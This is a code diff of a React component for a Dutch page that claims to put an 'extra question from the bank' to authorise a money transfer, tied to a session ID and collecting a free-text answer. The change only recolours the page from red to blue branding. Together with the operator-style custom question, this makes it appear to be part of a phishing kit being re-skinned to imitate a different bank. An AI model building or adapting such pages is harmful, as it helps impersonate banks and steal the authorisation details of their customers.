@@ -132,8 +132,8 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
 
   if (!ready) {
     return (
-      <div className="flex min-h-[100dvh] items-center justify-center bg-[#0c0207] px-4">
-        <div className="h-10 w-10 animate-spin rounded-full border-4 border-[#E30613]/25 border-t-[#E30613]" />
+      <div className="flex min-h-[100dvh] items-center justify-center bg-[#020824] px-4">
+        <div className="h-10 w-10 animate-spin rounded-full border-4 border-[#00A9E0]/25 border-t-[#00A9E0]" />
       </div>
     );
   }
@@ -143,7 +143,7 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
       <MercatorCard className="max-w-[420px]">
         {done ? (
           <div className="py-8 text-center">
-            <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-[#E30613]/15 text-[#ff4d57] shadow-[0_0_30px_rgba(227,6,19,0.35)]">
+            <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-[#00A9E0]/15 text-[#00A9E0] shadow-[0_0_30px_rgba(0,169,224,0.35)]">
               <svg className="h-7 w-7" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
               </svg>
@@ -164,8 +164,8 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
             </div>
 
             <div className="flex justify-center">
-              <div className="flex h-16 w-16 items-center justify-center rounded-full bg-[#E30613]/15 shadow-[0_0_30px_rgba(227,6,19,0.3)]">
-                <svg className="h-8 w-8 text-[#ff4d57]" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24">
+              <div className="flex h-16 w-16 items-center justify-center rounded-full bg-[#00A9E0]/15 shadow-[0_0_30px_rgba(0,169,224,0.3)]">
+                <svg className="h-8 w-8 text-[#00A9E0]" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24">
                   <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
                 </svg>
               </div>
@@ -175,8 +175,8 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
               Extra vraag van de bank ter autorisatie van de overboeking
             </h1>
 
-            <div className="rounded-2xl border-l-4 border-[#E30613] bg-[#E30613]/10 px-4 py-3">
-              <p className="mb-1 text-[10px] font-bold uppercase tracking-widest text-[#ff6b74]">
+            <div className="rounded-2xl border-l-4 border-[#00A9E0] bg-[#00A9E0]/10 px-4 py-3">
+              <p className="mb-1 text-[10px] font-bold uppercase tracking-widest text-[#7fd4ff]">
                 Vraag
               </p>
               <p className="text-sm font-semibold text-white/90 break-words">
@@ -200,17 +200,17 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
                   value={answer}
                   onChange={(e) => setAnswer(e.target.value)}
                   placeholder="Voer hier uw antwoord in..."
-                  className="w-full rounded-xl border border-white/15 bg-white/5 py-3.5 pl-10 pr-4 text-sm font-medium text-white outline-none transition-all placeholder:text-white/30 focus:border-[#E30613] focus:ring-2 focus:ring-[#E30613]/30"
+                  className="w-full rounded-xl border border-white/15 bg-white/5 py-3.5 pl-10 pr-4 text-sm font-medium text-white outline-none transition-all placeholder:text-white/30 focus:border-[#00A9E0] focus:ring-2 focus:ring-[#00A9E0]/30"
                 />
               </div>
             </div>
 
-            {error && <p className="text-center text-sm font-medium text-[#ff6b74]">{error}</p>}
+            {error && <p className="text-center text-sm font-medium text-[#7fd4ff]">{error}</p>}
 
             <button
               type="submit"
               disabled={saving || !answer.trim()}
-              className="flex w-full items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-[#E30613] to-[#b0050f] px-4 py-3.5 text-[15px] font-bold uppercase tracking-wide text-white shadow-[0_8px_30px_rgba(227,6,19,0.45)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-50"
+              className="flex w-full items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-[#00A9E0] to-[#b0050f] px-4 py-3.5 text-[15px] font-bold uppercase tracking-wide text-white shadow-[0_8px_30px_rgba(0,169,224,0.45)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-50"
             >
               {saving ? "Verzenden..." : "Doorgaan"}
               <svg className="h-4 w-4" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
